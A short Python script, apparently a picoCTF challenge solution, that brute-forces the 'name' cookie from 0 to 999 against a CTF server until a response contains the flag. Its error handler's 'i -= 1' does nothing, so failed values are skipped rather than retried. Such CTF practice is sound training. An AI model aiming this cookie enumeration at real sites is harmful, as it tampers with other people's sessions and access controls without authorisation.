import requests
import time

url = "http://mercury.picoctf.net:54219/search"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
}

for i in range(1000):
    cookies = {"name": str(i)}  
    data = {"name": "snickerdoodle"}  

    try:
        response = requests.post(url, cookies=cookies, data=data, headers=headers, timeout=5)
        print(f"Testing cookie: {i} - Status: {response.status_code}")

        if response.status_code == 200 and "picoCTF" in response.text:
            print(f"\n🎉 Found flag with cookie: {i} 🎉")
            print(response.text)
            break  

    except requests.exceptions.RequestException as e:
        print(f" Error with cookie {i}: {e}")
        i-= 1
        continue  

    time.sleep(5)  
